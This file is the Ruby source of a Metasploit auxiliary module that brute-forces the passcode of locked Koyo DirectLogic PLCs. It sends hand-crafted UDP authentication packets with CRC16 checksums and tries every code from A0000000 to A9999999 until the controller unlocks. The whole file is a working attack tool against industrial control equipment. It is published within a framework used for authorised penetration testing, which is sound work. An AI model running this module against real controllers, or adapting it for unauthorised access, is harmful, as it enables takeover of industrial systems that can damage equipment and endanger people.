##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

# msfdev is going to want a bunch of other stuff for style/compat but this works
# TODO: Make into a real AuthBrute module, although the password pattern is fixed

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Koyo DirectLogic PLC Password Brute Force Utility',
      'Description'    => %q{
          This module attempts to authenticate to a locked Koyo DirectLogic PLC.
        The PLC uses a restrictive passcode, which can be A0000000 through A9999999.
        The "A" prefix can also be changed by the administrator to any other character,
        which can be set through the PREFIX option of this module.

        This module is based on the original 'koyobrute.rb' Basecamp module from
        DigitalBond.
      },
      'Author'         =>
        [
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb' # Metasploit fixups
        ],
      'DisclosureDate' => 'Jan 19 2012',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
        ]
    )

    register_options(
      [
        OptInt.new('RECV_TIMEOUT', [false, "Time (in seconds) to wait between packets", 3]),
        OptString.new('PREFIX', [true, 'The prefix to use for the password (default: A)', "A"]),
        Opt::RPORT(28784)
      ], self.class)
  end

  @@CCITT_16 = [
    0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50A5, 0x60C6, 0x70E7,
    0x8108, 0x9129, 0xA14A, 0xB16B, 0xC18C, 0xD1AD, 0xE1CE, 0xF1EF,
    0x1231, 0x0210, 0x3273, 0x2252, 0x52B5, 0x4294, 0x72F7, 0x62D6,
    0x9339, 0x8318, 0xB37B, 0xA35A, 0xD3BD, 0xC39C, 0xF3FF, 0xE3DE,
    0x2462, 0x3443, 0x0420, 0x1401, 0x64E6, 0x74C7, 0x44A4, 0x5485,
    0xA56A, 0xB54B, 0x8528, 0x9509, 0xE5EE, 0xF5CF, 0xC5AC, 0xD58D,
    0x3653, 0x2672, 0x1611, 0x0630, 0x76D7, 0x66F6, 0x5695, 0x46B4,
    0xB75B, 0xA77A, 0x9719, 0x8738, 0xF7DF, 0xE7FE, 0xD79D, 0xC7BC,
    0x48C4, 0x58E5, 0x6886, 0x78A7, 0x0840, 0x1861, 0x2802, 0x3823,
    0xC9CC, 0xD9ED, 0xE98E, 0xF9AF, 0x8948, 0x9969, 0xA90A, 0xB92B,
    0x5AF5, 0x4AD4, 0x7AB7, 0x6A96, 0x1A71, 0x0A50, 0x3A33, 0x2A12,
    0xDBFD, 0xCBDC, 0xFBBF, 0xEB9E, 0x9B79, 0x8B58, 0xBB3B, 0xAB1A,
    0x6CA6, 0x7C87, 0x4CE4, 0x5CC5, 0x2C22, 0x3C03, 0x0C60, 0x1C41,
    0xEDAE, 0xFD8F, 0xCDEC, 0xDDCD, 0xAD2A, 0xBD0B, 0x8D68, 0x9D49,
    0x7E97, 0x6EB6, 0x5ED5, 0x4EF4, 0x3E13, 0x2E32, 0x1E51, 0x0E70,
    0xFF9F, 0xEFBE, 0xDFDD, 0xCFFC, 0xBF1B, 0xAF3A, 0x9F59, 0x8F78,
    0x9188, 0x81A9, 0xB1CA, 0xA1EB, 0xD10C, 0xC12D, 0xF14E, 0xE16F,
    0x1080, 0x00A1, 0x30C2, 0x20E3, 0x5004, 0x4025, 0x7046, 0x6067,
    0x83B9, 0x9398, 0xA3FB, 0xB3DA, 0xC33D, 0xD31C, 0xE37F, 0xF35E,
    0x02B1, 0x1290, 0x22F3, 0x32D2, 0x4235, 0x5214, 0x6277, 0x7256,
    0xB5EA, 0xA5CB, 0x95A8, 0x8589, 0xF56E, 0xE54F, 0xD52C, 0xC50D,
    0x34E2, 0x24C3, 0x14A0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405,
    0xA7DB, 0xB7FA, 0x8799, 0x97B8, 0xE75F, 0xF77E, 0xC71D, 0xD73C,
    0x26D3, 0x36F2, 0x0691, 0x16B0, 0x6657, 0x7676, 0x4615, 0x5634,
    0xD94C, 0xC96D, 0xF90E, 0xE92F, 0x99C8, 0x89E9, 0xB98A, 0xA9AB,
    0x5844, 0x4865, 0x7806, 0x6827, 0x18C0, 0x08E1, 0x3882, 0x28A3,
    0xCB7D, 0xDB5C, 0xEB3F, 0xFB1E, 0x8BF9, 0x9BD8, 0xABBB, 0xBB9A,
    0x4A75, 0x5A54, 0x6A37, 0x7A16, 0x0AF1, 0x1AD0, 0x2AB3, 0x3A92,
    0xFD2E, 0xED0F, 0xDD6C, 0xCD4D, 0xBDAA, 0xAD8B, 0x9DE8, 0x8DC9,
    0x7C26, 0x6C07, 0x5C64, 0x4C45, 0x3CA2, 0x2C83, 0x1CE0, 0x0CC1,
    0xEF1F, 0xFF3E, 0xCF5D, 0xDF7C, 0xAF9B, 0xBFBA, 0x8FD9, 0x9FF8,
    0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0
  ]

  def run_host(ip)

    # Create a socket in order to receive responses from a non-default IP
    @udp_sock = Rex::Socket::Udp.create(
      'PeerHost'  => rhost,
      'PeerPort'  => rport.to_i,
      'Context'   => {'Msf' => framework, 'MsfExploit' => self}
    )
    add_socket(@udp_sock)

    print_status("#{rhost}:#{rport} - KOYO - Checking the controller for locked memory...")

    if unlock_check
      # TODO: Report a vulnerability for an unlocked controller?
      print_good("#{rhost}:#{rport} - Unlocked!")
      return
    else
      print_status("#{rhost}:#{rport} - KOYO - Controller locked; commencing bruteforce...")
    end

    # TODO: Consider sort_by {rand} in order to avoid sequential guessing
    # or something fancier

    (0..9999999).each do |i|
      passcode = datastore['PREFIX'] + i.to_s.rjust(7,'0')
      vprint_status("#{rhost}:#{rport} - KOYO - Trying #{passcode}")
      bytes = passcode.scan(/../).map { |x| x.to_i(16) }
      passstr = bytes.pack("C*")
      res = try_auth(passstr)
      next if not res

      print_good "#{rhost}:#{rport} - KOYO - Found passcode: #{passcode}"
      report_auth_info(
        :host   => rhost,
        :port   => rport.to_i,
        :proto  => 'udp',
        :user   => '',
        :pass   => passcode, # NOTE: Human readable
        :active => true
      )
      break
    end

  end

  def crc16(buf, crc=0)
    buf.each_byte{|x| crc = ((crc << 8) ^ @@CCITT_16[( crc >> 8) ^ x]) & 0xffff }
    [crc].pack("v")
  end

  def unlock_check
    checkpacket = "HAP\xe6\x01\x6e\x68\x0d\x00\x1a\x00\x09\x00\x01\x50\x01\x02\x00\x01\x00\x17\x52"
    @udp_sock.sendto(checkpacket, rhost, rport.to_i)

    recvpacks = 0
    # TODO: Since the packet count is critical, consider using Capture instead,
    # but that requires root which is mildly annoying and not cross-platform.
    # IOW, not a hugely good way to solve this via packet counting, given the nature
    # of UDP.
    #
    # Another way to speed things up is to use fancy threading, but that's for another
    # day.
    while (r = @udp_sock.recvfrom(65535, 0.1) and recvpacks < 2)
      res = r[0]
      if res.length == 269 # auth reply packet
        if res[17,1] == "\x00" and res[19,1] == "\xD2" # Magic bytes
          return true
        end
      end
      recvpacks += 1
    end
    return false
  end

  def try_auth(passstr)
    data = "\x1a\x00\x0d\x00\x01\x51\x01\x19\x02\x04\x00" + passstr + "\x17\xaf"
    header = "HAP"
    header += "\xe5\x01" # random session ID
    header += crc16(data)
    header += [data.length].pack("v")
    authpacket = header + data

    @udp_sock.sendto(authpacket, rhost, rport.to_i)

    2.times { @udp_sock.get(recv_timeout) } # talk to the hand

    status = unlock_check

    return status
  end

  def recv_timeout
    if datastore['RECV_TIMEOUT'].to_i.zero?
      3
    else
      datastore['RECV_TIMEOUT'].to_i.abs
    end
  end
end
